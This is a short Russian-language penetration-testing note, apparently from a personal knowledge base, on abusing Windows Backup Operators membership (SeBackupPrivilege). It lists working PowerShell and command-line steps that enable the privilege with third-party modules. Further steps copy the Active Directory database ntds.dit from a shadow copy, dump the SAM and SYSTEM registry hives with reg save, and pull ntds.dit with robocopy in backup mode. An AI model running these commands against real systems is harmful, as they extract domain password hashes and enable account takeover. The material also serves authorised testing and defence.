#group #AD #windows #privillage #lpe 

> Членство в этой группе предоставляет ее участникам следующие права: `SeBackup` и `SeRestore`привилегии. Привилегия **`SeBackupPrivilege`** позволяет нам выводить список любой папки. Однако для этого нам необходимо программно скопировать данные, обязательно указав [флаг FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) .

Копирование с флагом  FILE_FLAG_BACKUP_SEMANTICS
```powershell
Copy-FileSeBackupPrivilege fileout.txt filein.txt
```

# Эксплуатация

Используем скрипт [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) для включение привилегии **`SeBackupPrivilege`**

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll


Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

Далее мы можем скопировать файл из защищенного места

## Копирование NTDS.dit

Для этого используем метод создания теневой копии и утилиту **`diskshadow.exe`** [[DCSync#2) diskshadow (lolbin)]]

Далее также копируем файл локально
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit .\ntds.dit
```


## Резервное копирование разделов реестра SAM и SYSTEM

```powershell
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

## Копирование файлов с помощью Robocopy

> Встроенная утилита robocopy также может использоваться для копирования файлов в режиме резервного копирования. Robocopy — это инструмент репликации каталогов из командной строки

```powershell
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

